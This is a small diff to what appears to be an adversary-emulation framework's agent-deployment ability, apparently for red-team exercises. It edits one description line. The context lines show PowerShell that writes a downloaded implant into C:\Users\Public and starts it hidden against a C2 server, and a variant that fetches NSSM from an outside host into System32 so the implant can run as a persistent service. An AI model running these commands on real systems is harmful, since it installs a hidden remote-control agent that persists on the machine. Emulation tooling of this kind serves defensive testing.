@@ -94,7 +94,7 @@
           [io.file]::WriteAllBytes("C:\Users\Public\#{agents.implant_name}.exe",$data) | Out-Null;
           Start-Process -FilePath C:\Users\Public\#{agents.implant_name}.exe -ArgumentList "-server $server -group red" -WindowStyle hidden;
         variations:
-          - description: Download a randomly-named agent and deploy a randomly-named automatic Windows Service
+          - description: Deploy a randomly-named agent & automatic Windows Service
             command: |
               Invoke-WebRequest -Uri 'http://nssm.cc/ci/nssm-2.24-101-g897c7ad.zip' -OutFile 'C:\Windows\System32\nssm-2.24-101-g897c7ad.zip';
               Expand-Archive -Force -Path 'C:\Windows\System32\nssm-2.24-101-g897c7ad.zip' -DestinationPath 'C:\Windows\System32';
